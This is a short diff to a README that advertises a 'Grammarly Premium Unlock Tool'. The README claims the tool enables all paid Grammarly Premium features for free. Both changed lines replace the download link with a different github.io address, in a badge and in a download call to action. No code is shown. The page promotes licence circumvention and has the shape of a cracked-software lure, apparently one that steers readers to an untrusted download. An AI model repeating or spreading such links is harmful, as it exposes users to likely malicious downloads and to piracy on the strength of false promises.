@@ -6,7 +6,7 @@
 <h1 align="center">⚡️ Grammarly Premium Unlock Tool</h1>
 
 <p align="center">
-  <a href="https://grammarly-premium-free-download.github.io/.github/" target="_blank">
+  <a href="https://grammarly-premium-download.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20Grammarly%20Premium%20Unlock%20Tool-Enable%20All%20Features-1DA1F2?style=for-the-badge&logo=grammarly&logoColor=white" 
          alt="Download Grammarly Premium Unlock Tool" style="width: 540px; height: 37px;">
   </a>
@@ -96,7 +96,7 @@ Report issues or contribute via Issues or Pull Requests.
 ## ⭐️ Unlock Grammarly Premium – Full Writing Enhancement
 
 Activate all Grammarly Premium features including grammar, style, spelling, vocabulary suggestions, and plagiarism detection.  
-[Download the Unlock Tool](https://grammarly-premium-free-download.github.io/.github/) and improve your writing instantly.
+[Download the Unlock Tool](https://grammarly-premium-download.github.io/.github/) and improve your writing instantly.
 
 ---
 
